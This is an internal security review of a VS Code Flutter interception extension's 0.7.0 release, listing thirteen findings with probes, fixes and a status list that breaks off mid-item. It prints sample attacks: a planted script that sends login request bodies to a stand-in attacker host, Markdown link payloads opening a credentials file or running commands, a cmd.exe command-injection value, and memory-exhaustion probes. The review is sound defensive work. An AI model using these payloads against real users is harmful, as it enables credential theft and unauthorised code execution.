# Review 7: v0.7.0 security (independent, `feature/0.7.0` working tree on 0592d89) — findings and fix plan

Scope: everything since 766fd48 (`git diff 766fd48 -- . ':!samples/demo_app/ios'` plus the untracked files):
script rules (`proxy/src/script.ts`, routing in `intercept-proxy.ts`, `extension/src/rules/{core,scriptFile,policy}.ts`,
`proxyHost.ts`, `controller.ts` validation, webview script editor), `take_screenshot` (`src/screenshot/**`, agent api,
LM tools, MCP), background-isolate installer (`src/vm/{isolates,transport,watcher,core}.ts`, template v5), OpenAPI /
Postman export (`src/export/**`, agent export tools, controller export flow, `har.ts`), notifications
(`src/notify/**` + wiring), the CLI (`packages/cli/**`), the editor panel (`src/ui/panel.ts`) and
`openScriptFile` / `openWorkspaceFile` in `src/extension.ts`. Spec: CONTRACTS §13 (+ §8, §12.1).

I read the code and ran throwaway probes in the session scratchpad (esbuild bundles of the real modules, outside the
repo; Node 26):
- the real `ScriptRunner`: classic vm escapes, `import()`, typed-array memory, `FinalizationRegistry`;
- `SharedRulesCore` + the real `validateRule` + `suggestScriptFile` on a real temp folder (planted script file);
- `createNotifyPolicy` with link syntax in the URL path, and VS Code's notification renderer (the installed
  `workbench.desktop.main.js`: message links are opened with `allowCommands: true`);
- `redactLogLine` on common `context.log` lines.

I did not run the unit, integration, device or CLI suites, and did not build or launch anything.

Threat model as in REVIEW-1 to REVIEW-6: a malicious cloned repo (trusted workspace, since the extension doesn't run
in Restricted Mode), a malicious or prompt-injected agent that only has our tools, a malicious app under debug, a
hostile server (including any site opened in the Flutter Web debug Chrome), other local users. Scripts are "trusted
code, not a sandbox" (§13.4), so the main question for scripts is whether code the user never approved can run.

| # | Sev | Finding | Owner |
|---|---|---|---|
| 1 | MED | **Personal script rules run repo-supplied code with no approval.** "Edit script in a file" pre-fills a guessable path (`.vscode/flutter-intercept/scripts/<rule name or last URL segment>.js`). If the repo already has a file there, "Create file" silently opens it instead, drops the user's inline code, and the personal rule runs the planted file. Later `git pull`s that change a committed personal script file also run straight away. Only shared rule ids are checked against an approval. **Probe:** rule on `…/v1/login` → suggested `…/scripts/login.js` → `resolveBodies` hands the planted code to the proxy, no problem line. | W + lead + S |
| 2 | LOW-MED | **Notification text renders Markdown links from untrusted input.** The URL path goes into `showWarningMessage` as is, and VS Code turns `[label](command:…/file:…/https:…)` in a notification into a clickable link that runs with `allowCommands: true`. A hostile server (via a redirect) or any web page in the Flutter Web debug browser can show "Flutter Intercept: GET /Details failed: 500" where "Details" opens `file:///…/.aws/credentials` or runs a no-argument command. | E |
| 3 | LOW | **Script limits can be bypassed.** (a) Typed arrays live outside the worker's 64 MB heap limit. **Probe:** +1.2 GB RSS in the host process after 6 calls, no error. (b) `FinalizationRegistry` callbacks run outside the 200 ms vm timeout, between calls. They can spin a core until the next call trips the watchdog. (c) The call queue has no limit and no wait deadline. | P |
| 4 | LOW | **The isolate installer can leave background isolates paused forever.** It asks DDS to hold every new isolate for it (`requirePermissionToResume`) even when its `Debug` stream subscription failed, because the transport ignores `streamListen` errors. Without `PauseStart` events nothing ever resumes them, and `compute()` / `Isolate.run` hang. | V |
| 5 | LOW | **The approval modal approves JavaScript the user can't see.** A held script shows only "runs JavaScript from the repository (<file>)" or "(inline code in the shared rules file)", with no code and no way to review it. The warning text describes re-routing, not code that reads and redirects every matching request. | lead + S |
| 6 | LOW | **Multi-root: "Open file" / "Create file" use the primary folder, but the proxy uses the rule's own folder.** For a secondary folder's shared rule, the user reviews or edits a different file (same relative path in the primary folder) from the one that is hashed, approved and run. This applies to script and body files, since 0.7.0 resolves body files per folder too. | lead + H + W |
| 7 | LOW | **"Turn off" may not turn notifications off.** `flutterIntercept.notifications` has window scope and is read merged, while "Turn off" writes user settings. A repo's `.vscode/settings.json` with `"all"` beats the user's `"off"`, so the button does nothing (one notice every 10 s while the panel is hidden). | lead |
| 8 | LOW | **`scriptLog` redaction misses the most common log shape.** `context.log('token', t)` gives `token abc123def456`, which is not redacted. Neither is an opaque token in the middle of a line (`set token to ghp_…`). | H |
| 9 | LOW | **A panel export with "Keep values" defaults to the project root**, with mode 0644 and no git-tracked check. Live tokens land in an untracked-but-not-ignored file, ready for the next `git add .`. Unredacted recordings are refused there (REVIEW-6 #9). | H |
| 10 | LOW | **The CLI prints the user's flutter args verbatim**, including secret `--dart-define=API_KEY=…` values, to stderr (`test`) and stdout (`run`), so they end up in CI logs. | C |
| 11 | LOW | **CLI on Windows: `shell: true` with unquoted args.** `--dart-define=API=https://x/?a=1&b=2` makes cmd.exe run `b=2` as a command. Spaces and `^%!` break or alter arguments. | C |
| 12 | LOW | **The CLI's default rules search can leave the project.** Without a `.git` it walks up to `/`, so `/tmp/.vscode/flutter-intercept.json` written by another local user is applied to a project under `/tmp`. Ungated mocks, blocks and response rewrites run, and body files resolve under `/tmp`. | C |
| 13 | INFO | Smaller items: the CLI writes outputs and wrappers through symlinks; SIGHUP or a crash leaves state behind; screenshots are 0644 and never pruned; MCP confirmations depend on the client; an isolate named `main` is skipped; a UDID-shaped test value; JSON keys in OpenAPI schemas; multipart bodies (pre-existing). | various |

## Details

### 1 (MED) Personal script rules run repo-supplied code with no approval
- `packages/webview/src/scripts.ts:32` `suggestScriptFile(name, url)`: the path is
  `.vscode/flutter-intercept/scripts/<slug>.js`. The slug comes from the rule name or, when the name is empty, from
  the last literal segment of the URL. Both are easy to guess for a repo that knows its own API (`login`, `auth`,
  `token`, `users`, `script`).
- `ActionEditor.tsx:321`: choosing "Edit script in a file" fills that path in. `:337` "Create file" posts
  `openScriptFile {path, create: {content: <inline code>}}`.
- `src/extension.ts:265` (`openWorkspaceFile`) writes only `if (create && !fs.existsSync(abs))`. Otherwise it opens
  the existing file without a word, and the inline code the user wrote is thrown away. The safe
  `SharedRulesCore.createScriptFile`, which never reuses an existing name, isn't used by the panel at all.
- `src/rules/core.ts:730` `readScriptFile` checks an approval only for `isSharedRuleId(ruleId)`. A personal rule gets
  whatever the file holds, and `proxyHost.resolveBodies` puts it in `code`.

Probe (`planted-probe.ts`: real `SharedRulesCore`, `validateRule`, `suggestScriptFile`, temp folder):

```
suggested: .vscode/flutter-intercept/scripts/login.js
problems: []  code run by the proxy: function onRequest(r){ return { ...r, url: 'https://collector.attacker.example/?' + encodeURIComponent(r.body||'') }; }
```

Scenario: a cloned repo commits `.vscode/flutter-intercept/scripts/login.js`, `auth.js` and `token.js`. Each looks
like a starter template, with one line that sets `request.url` to the attacker's host. The developer adds a script
rule on the login URL and picks "Edit script in a file". Then either:
- they save straight away (the path is pre-filled), or
- they click "Create file", which opens the planted file as if it were theirs.

From then on every login request, with its body (the password) and its headers (Authorization, cookies), goes to the
attacker. A script may change the URL to any http(s) host. There is no approval and no notice; nothing marks the file
as not the user's.

The same happens without planting: the hint tells users to commit `.vscode/flutter-intercept/scripts/` ("Commit it to
share the script"). Once a personal rule's file is in git, any upstream change to it (a teammate, a compromised
contributor, a branch switch) runs on the next watcher event. The equivalent shared rule would be held for approval.

**Fix:**
- W + lead: "Create file" must create a new file. Route it through `shared.createScriptFile(rule, code)`, which picks
  `-2`, `-3` … and never reuses a name, and put the returned path into the form (host → view reply). For "Open file"
  on a path that already exists but this window didn't create, say so ("This file was not created here — review it
  before using it"). Never drop the inline code silently.
- S: treat a personal script rule's file like a shared one by content. Remember the content hash the user created or
  saved from this window (`createScriptFile`, `onDidSaveTextDocument` on that path), per workspace. Hold the rule,
  with a "Review script" prompt, when the file's content was never seen or changed outside the editor (git checkout /
  pull), and approve on confirmation. At minimum, do this for files that are git-tracked or were not created by the
  extension.
- Test: a planted `scripts/login.js` is neither reused by "Create file" nor run for a new personal rule without
  confirmation. Changing a personal rule's file outside the editor holds the rule.

### 2 (LOW-MED) Notification text renders Markdown links from untrusted input
- `src/notify/policy.ts:59-80` `describeRequest`: the path is taken from `new URL(e.url).pathname`. WHATWG leaves
  `[ ] ( ) :` unescaped in paths. Only credential-looking segments are replaced.
- `src/extension.ts:516`: the text goes into `vscode.window.showWarningMessage('Flutter Intercept: …')`.
- VS Code's notification renderer parses `[label](href)` (href `https:`, `command:` or `file:`). In the installed
  build, `sMi.render(e.message, {callback: n => this.openerService.open(P.parse(n), {allowCommands: !0})})`.

Probe (real `createNotifyPolicy`):

```
GET /[Details](file:///Users/me/.aws/credentials) failed: 500 Internal Server Error
GET /Session%20expired.%20[Sign_in_again](command:workbench.action.reloadWindow) failed: 500 Internal Server Error
```

Both render as a Flutter Intercept warning with a link: "GET /Details failed: 500 …" and "… Sign_in_again …".

Who can trigger it:
- **A hostile server**: answer `302` to `https://evil.example/[Details](file:///…)`. dart:io follows the redirect
  through the proxy as a new exchange, and that one answers 500.
- **Flutter Web**: any web page in the debug Chrome. Its requests count as app traffic; only the browser's own
  requests are excluded.
- **A malicious app under debug.**

What a click does:
- `file:` links open any local file in an editor tab (where editor AI features read it). Same class as REVIEW-6 #7.
- `command:` links run any command that needs no arguments. `?` would start the URL query, so arguments can't be
  passed. Examples: `git.push`, `git.sync`, `workbench.action.debug.start` (the workspace launch config),
  `workbench.action.terminal.new`.
- `https:` links give phishing text under our name; VS Code asks before opening untrusted domains.

`describeOutcome` has the same exposure through error texts, for example a TLS error that quotes a hostile
certificate's SAN.

**Fix (E):**
- Percent-encode `[`, `]`, `(`, `)` in the path segments (`%5B` …) and the GraphQL name (already restricted).
- In `describeOutcome`, replace `[`→`(` and `]`→`)` (or strip them) in error text.
- Cap the path at ~120 characters.
- Test: neither probe text contains `](` after `noticeFor`.

### 3 (LOW) Script limits can be bypassed (memory, timers, queue)
`packages/proxy/src/script.ts`. The header promises the limits "keep a buggy script (a loop, a runaway allocation)
from hanging or crashing the extension host". Probe (`script-probe.ts`, real `ScriptRunner`):

- **Memory outside the heap limit.** `resourceLimits: {maxOldGenerationSizeMb: 64}` (`:295`) caps the V8 heap only.
  `ArrayBuffer` / typed-array backing stores are external memory in the shared host process. A script that keeps
  `new Uint8Array(100 MB).fill(1)` on a top-level `var` gave:

  ```
  0 held 200 MB  rss + 213 MB  …  5 held 1200 MB  rss + 1212 MB   (no error, the worker keeps running)
  ```

  A per-response cache in a top-level array (a plausible bug) grows until the extension host dies. This is the
  REVIEW-5 #1 / REVIEW-6 #3 class (+1.9 GB → MED there), rated lower here because scripts are trusted or approved.
- **Code outside the vm timeout.** `FinalizationRegistry` cleanup callbacks are platform tasks. They run between
  calls, outside `runInContext`'s 200 ms timeout and outside the watchdog, which only covers a call in flight. A
  callback that loops 5 s made every second call fail with "did not finish within 1 s; the script engine was
  restarted". With `while (true)` and no further traffic, the worker spins a core indefinitely. `WeakRef` gives the
  same timing. Promise reactions from earlier calls also run during later calls (seen with `import()`); that is
  harmless, but "synchronous hooks only" isn't enforced.
- **Unbounded queue** (`:259`). Calls run one at a time, up to 200 ms each, so the queue has no length limit and no
  wait deadline. Each queued call keeps its JSON input (bodies ≤ 1 MB). A page in the Flutter Web debug browser can
  POST 1 MB bodies in a loop to a URL a `*` script rule matches. Memory grows, and the app's own scripted requests
  wait behind them indefinitely.

**Fix (P):**
- In BOOTSTRAP, delete `FinalizationRegistry`, `WeakRef`, `SharedArrayBuffer`, `Atomics` and `WebAssembly` from the
  context. `WebAssembly.Memory` works without code generation and hands out ArrayBuffers.
- After every load and call, the worker checks `v8.getHeapStatistics().external_memory` (per isolate) and reports
  "the script holds more than 64 MB of binary data". The main thread then terminates and restarts the worker.
- Cap the queue (for example 256 calls) and give each call a deadline that counts its wait (for example 5 s). Past
  either, answer 502 "script engine busy".
- Tests: the typed-array probe ends with an error and RSS growth < 100 MB; a registry callback can't run.

### 4 (LOW) The isolate installer can leave background isolates paused forever
- `src/vm/transport.ts:199-205`: `connectWsTransport` swallows every `streamListen` failure ("calls still work").
- `src/vm/isolates.ts:261`: `start()` then calls `requirePermissionToResume {onPauseStart: true}` regardless. DDS now
  waits for our `readyToResume` on every new isolate.
- The only triggers are `PauseStart` events on the `Debug` stream and the one-off `getVM` scan in `start()`. The 2 s
  budget timer starts in `onPauseStart`, so an isolate we never hear about has no budget.

If the subscription fails, every `compute()` / `Isolate.run` / `Isolate.spawn` isolate stays paused until the session
ends or the socket closes. The app hangs on its first background job, and nothing in our log says why. This
contradicts §13.3 "must never leave an isolate paused". It is unlikely today (DDS accepts `Debug` from a new client),
but it is a fail-open dependency on an ignored error.

**Fix (V):**
- Make the `Debug` subscription mandatory for the installer: reject unless it succeeds or answers "already
  subscribed" (code 103) before `requirePermissionToResume`.
- While active, re-scan `getVM` every ~2 s for isolates whose `pauseEvent.kind === 'PauseStart'` that we haven't
  handled, and handle them (budget included).
- Test: a fake transport whose `streamListen('Debug')` fails → no `requirePermissionToResume`, the transport is
  closed.

### 5 (LOW) The approval modal approves JavaScript the user can't see
- `src/extension.ts:233-245`, `policy.ts` `case 'script'`: the detail line is `• <name> (<match>) in <folder>: runs
  JavaScript from the repository (<file>)`. For inline code it says `(inline code in the shared rules file)`.
- The closing sentence ("can send your app's requests … to another server or change what it receives") undersells a
  script. A script can read every header and body of the matched traffic, change the URL to any host, and answer
  locally.
- Nothing in the modal or the panel shows the code that is about to be approved. Inline code sits in a JSON string in
  `.vscode/flutter-intercept.json`, unreadable in practice.

Approval is per content hash, so this isn't a bypass. But the gate only helps if the code is reviewed, and the
approval UI doesn't support that.

**Fix (lead + S):**
- Add a "Review scripts…" button to the modal: open each held script, the file resolved in its own folder (see #6),
  or the inline code as a read-only virtual document.
- Show the size and the first lines in the detail.
- Use a script-specific warning: "runs JavaScript that can read and redirect every matching request, with its
  credentials".

### 6 (LOW) Multi-root: "Open file" / "Create file" use a different folder than the proxy
- `src/extension.ts:261`: `openWorkspaceFile` calls `shared.bodyFilePath(rel)` with no rule id, so it resolves
  against the primary folder.
- The proxy resolves per rule: `setBodyFileResolver((p, id) => …)` (`:210`) and `resolveScriptFile(p, ruleId)`.
  `openScriptFile` / `openBodyFile` messages carry no rule id.

Scenario:
- Workspace: the user's own app A, which has `.vscode/flutter-intercept/scripts/auth.js`, plus a cloned package B.
- B's shared script rule uses the same relative path.
- The user opens it from the rule editor and reads A's benign file, approves, and B's file runs.

The same mismatch exists for body files, since 0.7.0 resolves them per folder. REVIEW-6's accepted residual assumed
both sides used the primary folder.

**Fix (lead + H + W):**
- Add `ruleId?` to `openBodyFile` / `openScriptFile` (protocol, controller) and resolve with
  `shared.bodyFilePath(rel, ruleId)`.
- When creating, require the resolved folder to be the rule's folder.

### 7 (LOW) "Turn off" may not turn notifications off
- `package.json` `flutterIntercept.notifications` has no `scope` (window).
- `extension.ts:522`: `getLevel` reads the merged value. `:521`: `turnOff` writes `ConfigurationTarget.Global`.

A workspace value (`"all"` from a repo's `.vscode/settings.json`) therefore overrides the user's `"off"` from the
button. The policy sets `off` in memory, but the next `onDidChangeConfiguration` → `refreshLevel()` reads `"all"`
again. The result is a notice every 10 s while the panel is hidden, with a "Turn off" button that does nothing. That
is nuisance, not data exposure. `backgroundIsolates` is also window-scoped; a repo can only turn interception down to
`warn`, which is harmless.

**Fix (lead):**
- Give `notifications` `"scope": "application"` and read it with `inspect().globalValue` like the agent settings.
- Or let a user-level `off` win over workspace values, and have "Turn off" also clear workspace and folder values.

### 8 (LOW) `scriptLog` redaction misses the most common log shape
`src/agent/redact.ts:528-544` `redactLogLine`. `context.log(a, b, …)` joins its arguments with spaces
(`script.ts:67`), so the natural `context.log('token', value)` produces `token <value>`. Probe:

| Line | Agents see |
|---|---|
| `token abc123def456` | unchanged |
| `apiKey sk_live_…` (a Stripe-format test key) | unchanged |
| `x-api-key k-12345-abcde` | unchanged |
| `set token to ghp_…` (a GitHub-format test token) | unchanged |
| `password=hunter2&user=bob`, `cookie session=s3cr3t`, JSON, `Bearer …`, URLs | redacted ✔ |

**Fix (H):**
- Also redact the word after a sensitive name separated only by whitespace (`<name>\s+<value>`).
- Redact any whitespace-separated word that `isOpaqueToken` matches or that has a known token prefix (`ghp_`,
  `sk_live_`, `xox[bp]-`, `AKIA`).
- Alternative: the proxy keeps the log arguments apart (for example a `\u0000` separator, which the host turns into
  spaces after redaction) so each value can be redacted with its preceding string as the key.

### 9 (LOW) A panel export with "Keep values" defaults to the project root
- `src/ui/controller.ts:1247` defaults the save dialog to `<project>/<app>.openapi.json`.
- `:1249` writes with `fs.promises.writeFile` (0644).
- Choosing "Keep values" puts live Authorization values, cookies and tokens (examples, Postman headers and bodies, a
  HAR) in a file that is usually neither ignored nor noticed.

REVIEW-6 #9 already refuses unredacted recordings in git-tracked places (`gitIgnoreStatus`), and the CLI writes its
unredacted HAR 0600.

**Fix (H):**
- When values are kept, default to `.dart_tool/flutter_intercept/exports/` and write 0600.
- If the chosen file is `not-ignored` by git, ask again ("This file would be committed with live credentials").

### 10 (LOW) The CLI prints secret dart-defines
`packages/cli/src/run.ts:272` logs `flutter test … <extra>` and `:287` prints the `flutter run` command, both with the
user's args after `--` verbatim. CI pipelines pass API keys as `--dart-define=API_KEY=$SECRET`, and Flutter itself
never prints them. GitHub masks registered secrets, but many runners don't, and the values persist in build logs.

**Fix (C):** print `--dart-define=NAME=***` (and only the path of `--dart-define-from-file`) for every define except
ours.

### 11 (LOW) CLI on Windows: `shell: true` with unquoted args
`run.ts:69` spawns flutter with `shell: process.platform === 'win32'`. Node needs this for `flutter.bat` since the
CVE-2024-27980 change, but it joins the args unquoted. `cmd.exe` then interprets `& | < > ^ %`:
- `-- --dart-define=API=https://x/api?a=1&b=2` runs `b=2` as a second command;
- a value with spaces is split.

The args are the user's own command line, so this is mostly a correctness bug, but it executes text the user meant as
data. Device ids from `flutter devices` go through the same path.

**Fix (C):** quote every argument for cmd.exe (wrap in `"…"`, double `"`, caret-escape `%` and `!`, refuse newlines),
or build the command line yourself and spawn `cmd.exe /d /s /c "<line>"` with `windowsVerbatimArguments`. Add a test
with `&`, spaces and `%`.

### 12 (LOW) The CLI's default rules search can leave the project
`packages/cli/src/rules.ts:55` `findDefaultRulesFile` walks from the project up to the first `.git`, and to `/` when
there is none (a source archive, a CI artifact, a copied folder). A project at `/tmp/build/app` picks up
`/tmp/.vscode/flutter-intercept.json`, which any local user can create because `/tmp` is world-writable.
`rulesLocation` then uses `/tmp` as the folder, so body files resolve there too.

Gated rules are still skipped. Ungated ones run in the test: JSON mocks, blocks, faults, throttles, response
rewrites. They change the traffic and therefore the test outcome, and `--har` / `--record` capture the result.

**Fix (C):**
- Walk up only while inside a git work tree (find `.git` first, then search between the project and that root);
  otherwise use only `<project>/.vscode/flutter-intercept.json`.
- Refuse a rules file in a directory writable by others, or owned by another user.

### 13 (INFO)
- **CLI file writes follow symlinks.**
  - `outputs.ts:22` `writeOutput` writes `<file>.<pid>.tmp` with flag `w`, which follows a planted symlink. CI pids
    are predictable, and the mode only applies on create.
  - `entries.ts:144-147` write `integration_test/.flutter_intercept/.gitignore` and the wrappers through symlinks
    (`mkdirSync` with `recursive`, `writeFileSync`).

  A repo can make the CLI clobber files outside the project with fixed content. Building a malicious repo for a
  device test already runs its code (Gradle, CocoaPods, Xcode phases), hence INFO. Fix: `wx` with a random tmp name;
  `ensureDirInside` (har.ts) for the wrapper folder; `lstat` refusal.
- **CLI cleanup on SIGHUP / crash.** Only SIGINT / SIGTERM run the `finally`. Closing the terminal (SIGHUP) or an
  uncaught exception in an event handler leaves:
  - the `adb reverse`;
  - the wrapper folder (gitignored);
  - the generated entry (trusting the run CA);
  - the CA key in `/tmp/flutter-intercept-run-*` (0700).

  Handle SIGHUP like SIGTERM; `process.on('exit')` best-effort `rmSync` of the temp dir and `adb reverse --remove`.
- **Screenshots** (`screenshot/index.ts:176`) are written 0644 in a 0755 folder and never pruned. App screens often
  show personal data or one-time codes. Write 0600 in a 0700 folder like recordings, and keep the last N (for example
  50).
- **MCP confirmations depend on the client.** `take_screenshot` (allowed under `readOnly`) relies on clients asking
  because of `readOnlyHint: false`. With a server-wide allowlist (`mcp__flutter-intercept__*`, Cursor auto-run), the
  image is taken silently. This matches §8 for write tools; worth one sentence in the README next to the setting.
- **An isolate named `main` is never installed** (`isolates.ts:142,146`). `Isolate.spawn(…, debugName: 'main')`
  bypasses interception. It's the app's own choice, so this doesn't matter for security; consider checking
  `rootLib` + "is the first isolate" instead of the name.
- **A UDID-shaped test value**: `test/unit/screenshot.test.ts:114,197` use `00008110-001A2C3E0E12801E`, which has the
  shape of a real iPhone UDID (the other fixture is an obvious `000A0B0C…`). If it isn't synthetic, replace it (owner
  rule: no device UDIDs in the repo).
- **OpenAPI schemas keep JSON keys verbatim.** An object keyed by tokens or e-mail addresses (`{"<jwt>": {...}}`)
  puts them in `properties` even with redaction on. Apply `isParamSegment`-style detection to keys and fall back to
  `additionalProperties`.
- **Pre-existing, now in two more exports:** multipart and plain-text request bodies are redacted only for JWT /
  Bearer values (`password` form parts stay). Same as HAR / `get_request`.
- **The script call queue is shared by all rules** (see #3): one slow rule delays every other script rule.

## Checked, fine
- **Script sandbox** (probes on the real `ScriptRunner`):
  - `this.constructor.constructor(...)`, `Function` from any reachable function, and `eval` all fail with "Code
    generation from strings disallowed".
  - `import('fs')` rejects with `ERR_VM_DYNAMIC_IMPORT_CALLBACK_MISSING`; `WebAssembly.Module` is refused by the
    embedder; `process`, `require`, `setTimeout` and `fetch` are undefined.
  - `Error.prepareStackTrace` CallSites expose only context-realm functions (worker frames are strict).
  - `f.caller` stops at the user's own function.
  - Inputs enter as one JSON string. Results leave as a string produced by the captured `stringify`.
  - `__fi_invoke` / `__fi_state` are non-writable. Worker-side reads of attacker objects (`describe`, `linesOf`,
    `String(out)`) are strict code, receive no worker-realm values, and are bounded by the watchdog.
  - `microtaskMode: 'afterEvaluate'` keeps promise jobs inside the timeout.
- **Script results**:
  - header names are tokens, values without CR/LF/NUL;
  - status 100–599, body ≤ 5 MB, method token and not CONNECT, URL http(s) only;
  - a returned Promise is an error;
  - `__proto__` keys are harmless (own JSON keys, copied by spread);
  - edits go through `applyRequestEdit` / `applyResponseEdit` (re-framed), and LAN-guarded agents check the final
    target;
  - WebSocket upgrades are refused at validation.
- **Shared script approval**:
  - every shared `script` is gated;
  - inline code is part of the rule hash;
  - for `file`, the hash covers the file text (an unreadable file gets its own hash, which can never match text);
  - every read re-checks the text against the approved hash, then reloads and refuses on a mismatch;
  - the watcher reloads before re-resolving, and the body cache is invalidated on change;
  - `file` plus inline `code`: the code is neither hashed nor ever run (the file wins; an unreadable file skips the
    rule); `file: ""` is refused by the validator;
  - personal rules being shared are approved with the file hash read at write time;
  - the CLI skips held rules unless `--approve-shared-rules` and prints the reasons;
  - the modal's snapshot hash still protects against changes while it is open.
- **Agents and scripts**:
  - `insertRule` refuses scripts (also inside sequences), and no schema builds one;
  - `ruleView` strips `code` for `list_rules` and the `intercept://rules` resource, whatever the redaction setting;
  - `scriptLog` goes through `redactLogLine` (see #8 for its gaps);
  - `remove_rule` is the only change agents can make;
  - `ruleFromExchange(…, 'script')` is only reachable from the webview;
  - no new MCP resources.
- **`take_screenshot`**:
  - agents pass only a `sessionId`; the device id comes from the session and is validated (`deviceKind`: no leading
    `-`; simulators are UUIDs only);
  - `execFile` with argument arrays; `simctl` writes into a fresh `mkdtemp` that is then removed;
  - the save folder goes through `ensureDirInside` (`lstat`, no symlinks), with `wx`;
  - 16 MB caps on the base64, `maxBuffer` and the file;
  - `agent.screenshots` is application-scoped and read via `globalValue`, and checked in `AgentApi` (both doors);
  - LM confirmation under `readOnly` too;
  - the image is a non-enumerable symbol (not in `structuredContent`, JSON or logs);
  - `recentRequests` are redacted summaries.
- **Isolate installer**:
  - loopback-only WebSocket (`isLoopbackWsUri` before connecting), and the URI is never logged (error texts are
    generic);
  - `readyToResume` runs on every path within the 2 s budget, and a failed resume or setup closes the socket (DDS
    then resumes);
  - VM answers are type-checked; isolate names go through `cleanText`;
  - `invoke` is called only in isolates whose root library matches the entry path; a spawnUri'd copy of an entry path
    only runs its own install function.
- **Export**:
  - origins exclude userinfo (`user:pass@`), and servers / `{{baseUrl}}` come from `URL.origin`;
  - credential-looking path segments become parameters with no example;
  - query examples come from `redactUrl`;
  - bodies go through `redactBodyText` (GraphQL `query` / `variables` handled, cut after redaction);
  - Postman: sensitive request headers become empty `{{variables}}`, and response headers are redacted;
  - the agent tools follow the user-level setting and write via `writeExportFile` (`ensureDirInside`, `wx`,
    timestamp names, extension regex);
  - the panel asks every time.
- **Notifications**:
  - path only (no host, query or fragment); credential segments are redacted; query strings are stripped from URLs in
    errors;
  - one notice per 10 s; each exchange once (10 000 ids);
  - mocked, blocked, replayed and simulated failures, and browser-internal or initiator traffic, are excluded;
  - nothing is queued while the panel is visible.
- **CLI**:
  - temp CA dir 0700 (`mkdtemp` + `chmod`), deleted in `finally` on SIGINT / SIGTERM (second Ctrl-C forces);
  - proxy on 127.0.0.1; `adb reverse` removed;
  - wrappers gitignored and deleted; entry names restricted to `[A-Za-z0-9_]`;
  - unredacted HAR 0600; `--record` goes through the recording store (tracked-folder refusal, symlink checks);
  - physical iOS and web refused; breakpoints turned off; POSIX spawns use argument arrays;
  - the `vscode` module isn't imported.
- **Own-window panel**: the same `webviewHtml` (CSP `default-src 'none'`, nonce from `crypto.randomBytes`), resource
  root `dist/webview` only, the same controller handler, one instance.
- **`openScriptFile` / `openWorkspaceFile`**:
  - `.js` only (controller `checkScriptFile`: no absolute path, `..` or control characters); content ≤ 256 KB and
    secret-checked;
  - folders are created one level at a time, refusing symlinks; the file with `wx` (never through a dangling link);
  - opening goes through `checkSourcePath` (realpath inside a workspace root).
- **Timings**: `timedAgent` only wraps `addRequest` and delegates everything else to the original agent, so the LAN
  guard and upstream-proxy agents keep their `createConnection` checks. Phases are integers, with no URLs or headers.
- **Settings**: the new agent setting is user-only. Agent access, redaction and the upstream proxy keep their
  REVIEW-6 scopes.

## Fix plan
- **W + lead + S:** #1: "Create file" always creates a new file (via `createScriptFile`) and reports the path; warn
  on an existing file; content-hash confirmation for personal script files changed outside the editor.
- **E:** #2: escape `[ ] ( )` in notification paths and error texts.
- **P:** #3: remove `FinalizationRegistry`, `WeakRef`, `SharedArrayBuffer`, `Atomics` and `WebAssembly` from
  contexts; external-memory check per call; queue cap and deadline.
- **V:** #4: mandatory `Debug` subscription; periodic `PauseStart` sweep.
- **lead + S:** #5: "Review scripts…" in the approval modal, and script-specific wording.
- **lead + H + W:** #6: rule id on `openBodyFile` / `openScriptFile`, resolved per folder.
- **lead:** #7: `notifications` user-only (application scope / `globalValue`), or user `off` wins.
- **H:** #8: whitespace pairs and opaque words in `redactLogLine`. #9: "Keep values" defaults to `.dart_tool/…/exports`,
  0600, git-tracked warning.
- **C:** #10: mask user dart-defines in logs. #11: cmd.exe quoting on Windows. #12: rules search bounded to the git
  work tree / project; refuse world-writable locations. #13: `wx` random tmp names, `ensureDirInside` for wrappers,
  SIGHUP and exit cleanup.
- **V / lead:** #13: screenshots 0600 / 0700 with retention; replace the UDID-shaped fixture if it is real.
- **Before release, add tests:**
  - a planted `scripts/login.js` is never reused or run for a new personal script rule without confirmation;
  - a notification for `/[x](command:foo)` contains no `](`;
  - the typed-array probe fails with an error and RSS growth < 100 MB; `FinalizationRegistry` is undefined in a
    script;
  - the installer doesn't call `requirePermissionToResume` when `streamListen('Debug')` fails;
  - in a multi-root workspace, opening a secondary folder's script opens that folder's file;
  - a workspace `"flutterIntercept.notifications": "all"` doesn't override a user `off`;
  - `redactLogLine('token abc123def456')` is redacted;
  - CLI: `--dart-define=K=secret` is not printed; on Windows an `&` in an argument stays an argument.

## Found during integration (lead)

| # | Sev | Finding | Owner |
|---|---|---|---|
| 14 | MED (pre-existing) | **VS Code's `http.proxySupport` patch replaced the proxy's upstream agents.** The extension host gives each extension patched `http`/`https` modules whose `request()` swaps in VS Code's proxy agent for every non-loopback target. mockttp (bundled) used them, so inside VS Code our agents were dropped: no connect-time LAN SSRF / DNS-rebinding re-check for LAN clients (the match-time check still ran), `flutterIntercept.upstreamProxy` ignored for remote targets, the 10.0.2.2 / 10.0.3.2 rewrite dropped, no pooling, and (0.7.0) no upstream timings. Invisible in plain-Node tests. **Fix:** `bypassPatchedRequests` (proxy `upstream-pool.ts`) sends requests that carry one of our agents to Node's own `node:http` / `node:https` `request`; everything else still goes through VS Code's patch. Test with a VS Code-like agent-swapping patch. Behaviour change: the app's pass-through traffic no longer follows VS Code's `http.proxy`; chaining is `flutterIntercept.upstreamProxy`. | P |

## Status (2026-10-10)

All findings fixed in the `feature/0.7.0` working tree:
- **#1** personal script files are approved per content hash (workspaceState), like shared ones; "Create file" refuses an
  existing file and approves what it writes; a save in VS Code approves the saved content; files changed outside VS
  Code wait in the approval banner (S, W, lead).
- **#2** notification paths, operation names and errors are neutralised (`[ ] ( ) \ \``) (E).
- **#3** `FinalizationRegistry`, `WeakRef`, `SharedArrayBuffer`, `Atomics`, `WebAssembly` removed from script contexts;
  > 64 MB external memory after a call restarts the worker; queue ≤ 100, 2 s wait deadline (P).
- **#4** the installer subscribes to `Debug` itself and never asks for resume permission without it; 2 s PauseStart
  sweep; 3 failed sweeps close the connection (V).
- **#5** the approval modal offers "Review scripts…" (the exact code whose hash is approved) and script wording (S, lead).
- **#6** `openBodyFile` / `openScriptFile` carry `ruleId`; files resolve in the rule's own folder (lead, H, W).
- **#7** `flutterIntercept.notifications` is application-scoped and read from user settings only (lead).
- **#8** `redactLogLine` redacts whitespace pairs and opaque / prefixed tokens anywhere (H).
- **#9** "Keep values" exports default to `.dart_tool/flutter_intercept/exports/`, 0600, modal warning when git would
  track the file (H).
- **#10–#12** CLI: dart-define values masked, cmd.exe quoting without `shell: true`, rules search bounded to the git work
  tree / project and world-writable or foreign-owned rules files refused (C).
- **#13** CLI writes via exclusive temp files + rename, no symlinked folders, SIGHUP / exit cleanup; screenshots 0600 in
